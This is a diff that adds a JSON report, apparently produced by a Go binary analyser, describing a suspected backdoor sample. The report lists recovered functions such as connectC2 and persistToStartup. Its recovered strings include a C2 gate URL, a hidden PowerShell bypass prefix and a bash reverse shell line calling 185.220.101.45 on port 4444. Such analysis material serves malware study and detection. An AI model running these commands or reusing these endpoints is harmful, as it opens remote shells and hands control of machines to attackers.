@@ -1,0 +1,49 @@
+{
+  "Version": "1.21.3",
+  "BuildId": "Zb9QmokKTiOUgHKmaIwz/wd2rtE3W9PN-um1Ocdzh",
+  "Arch": "amd64",
+  "Os": "linux",
+  "TabMeta": {
+    "VA": 5174784,
+    "Version": "1.2",
+    "Endianess": "LittleEndian",
+    "CpuQuantum": 1,
+    "CpuQuantumStr": "x86/x64",
+    "PointerSize": 8
+  },
+  "UserFunctions": [
+    { "FullName": "main.main",            "Start": 4198400, "End": 4198500 },
+    { "FullName": "main.connectC2",       "Start": 4198600, "End": 4198700 },
+    { "FullName": "main.runShellCommand", "Start": 4199000, "End": 4199100 },
+    { "FullName": "main.encryptPayload",  "Start": 4199200, "End": 4199300 },
+    { "FullName": "main.persistToStartup","Start": 4199400, "End": 4199500 }
+  ],
+  "StdFunctions": [
+    { "FullName": "net/http.Get",                    "Start": 4300000, "End": 4300100 },
+    { "FullName": "net/http.Post",                   "Start": 4300200, "End": 4300300 },
+    { "FullName": "net.Dial",                        "Start": 4300400, "End": 4300500 },
+    { "FullName": "os/exec.Command",                 "Start": 4400000, "End": 4400100 },
+    { "FullName": "os/exec.(*Cmd).Run",              "Start": 4400200, "End": 4400300 },
+    { "FullName": "crypto/aes.NewCipher",            "Start": 4500000, "End": 4500100 },
+    { "FullName": "crypto/cipher.NewCFBEncrypter",   "Start": 4500200, "End": 4500300 },
+    { "FullName": "os.Create",                       "Start": 4600000, "End": 4600100 },
+    { "FullName": "os.WriteFile",                    "Start": 4600200, "End": 4600300 }
+  ],
+  "Strings": [
+    { "str": "http://185.220.101.45/gate.php" },
+    { "str": "https://pastebin.com/raw/xK9mZ3qA" },
+    { "str": "185.220.101.45" },
+    { "str": "10.0.0.1:4444" },
+    { "str": "cmd.exe /c whoami" },
+    { "str": "powershell -NoP -NonI -W Hidden -Exec Bypass" },
+    { "str": "/bin/bash -i >& /dev/tcp/185.220.101.45/4444 0>&1" },
+    { "str": "GOOS=linux" },
+    { "str": "runtime/internal/atomic" }
+  ],
+  "Types": [],
+  "Files": [
+    "main.go",
+    "c2.go",
+    "crypto.go"
+  ]
+}
